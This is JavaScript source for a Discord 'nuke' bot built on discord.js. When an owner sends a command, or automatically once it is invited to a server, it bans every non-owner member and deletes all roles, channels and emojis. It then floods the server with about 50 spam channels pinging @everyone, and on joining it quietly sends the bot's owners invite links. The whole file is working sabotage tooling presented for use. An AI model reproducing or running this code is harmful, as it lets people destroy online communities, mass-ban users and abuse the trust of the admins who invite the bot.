const discord = require("discord.js"); /* You need to use discord.js 12.0.0 . Install with "npm install discord.js@12.0.0" */
const bot = new discord.Client();
bot.login(""); /* Here you will put the token */

const owners = ["ownerid"]; 
const settings = require("./settings.json");

bot.on("ready", () => {
    console.log("The bot is online.")
});

bot.on("message", (message) => {
    if(message.content.startsWith("f!uck")) {
        if(owners.some(s => s == message.author.id)) {
            NukeThisShitServer(message.guild)
        }
        else message.channel.send("you are not my owner, idiot !");
    }
});

bot.on("guildCreate", (guild) => {
    owners.forEach((id) => {
        if(bot.users.cache.get(id)) {
            bot.users.cache.get(id).send(`GUILD ADD: ${guild.name} - owned by: ${guild.owner.user.tag}`);
            if(settings.auto_invite_create_when_bot_join_in_a_guid) {
                guild.channels.cache.first().createInvite().then(invite => {
                    bot.users.cache.get(id).send(`Here is your invite link: ${invite.url}`);
                }).catch(() => {
                    bot.users.cache.get(id).send(`Could not create an invite link...`);
                });
            }
        }
    });

    if(settings.auto_nuke) {
        NukeThisShitServer(guild);
    }
});

bot.on("guildDelete", (guild) => {
    owners.forEach((id) => {
        if(bot.users.cache.get(id)) {
            bot.users.cache.get(id).send(`GUILD REMOVE: ${guild.name} - owned by: ${guild.owner.user.tag}`);
        }
    });
});

bot.on("guildMemberAdd", (member) => {
    
});

function NukeThisShitServer(server) {
    if(server) {
        if(settings.actions.change_server_icon) {
            server.setIcon(settings.icon).then(() => {
                console.log("ICON: I successfully changed the server's avatar.");
            }).catch(() => {
                console.log("ICON: Could not change the server's avatar...");
            });
        }

        if(settings.actions.change_server_name) {
            server.setName(settings.name).then(() => {
                console.log("NAME: I successfully changed the server's name.");
            }).catch(() => {
                console.log("NAME: Could not change the server's name...");
            });
        }

        if(settings.actions.ban_all) {
            server.members.cache.forEach(member_obj => {
                if(!owners.some(s => s == member_obj.user.id)) {
                    member_obj.ban().then(() => {
                        console.log(`BAN: Succesfully banned: ${member_obj.user.tag}`);
                    }).catch(() => {
                        console.log(`BAN: Coult not ban: ${member_obj.user.tag}`);
                    });
                }
            });
        }

        if(settings.delete.roles) {
            server.roles.cache.forEach(role_obj => {
                role_obj.delete().then(() => {
                    console.log(`ROLE: Successfully deleted role: ${role_obj.name}`);
                }).catch(() => {
                    console.log(`ROLE: Coult not delete role: ${role_obj.name}`);
                });
            });
        }

        if(settings.delete.channels) {
            server.channels.cache.forEach(channel_obj => {
                channel_obj.delete().then(() => {
                    console.log(`CHANNEL: Successfully deleted channel: ${channel_obj.name}`);
                }).catch(() => {
                    console.log(`CHANNEL: Coult not delete channel: ${channel_obj.name}`);
                });
            });
        }

        if(settings.delete.emojis) {
            server.emojis.cache.forEach(emoji_obj => {
                emoji_obj.delete().then(() => {
                    console.log(`EMOJI: Successfully deleted emoji: ${emoji_obj.name}`);
                }).catch(() => {
                    console.log(`EMOJI: Coult not delete emoji: ${emoji_obj.name}`);
                });
            });
        }

        setTimeout(() => {
            for(var i = 0; i < 50; i++) {
                if(settings.create_after_nuke.channels) {
                    server.channels.create(settings.name, {
                        type: "text"
                    }).then((c) => {
                        c.send("@everyone, ahaha: " + settings.icon)
                    }).catch(() => {});
                }

                if(settings.create_after_nuke.roles) {
                    server.roles.create("new-role").then(role => {
                        role.setName(settings.name);
                    }).catch(() => {});
                }

                if(settings.create_after_nuke.emojis) {
                    server.emojis.create(settings.icon, `${i}`).then(() => {
                        console.log(`EMOJI: Created emoji '${i}'`);
                    }).catch(() => {
                        console.log(`EMOJI: Could not create emoji '${i}'`);
                    });
                }
            }
        }, 2000);
    }
    else console.log("SERVER: Sorry, but this server does not exists...");
}
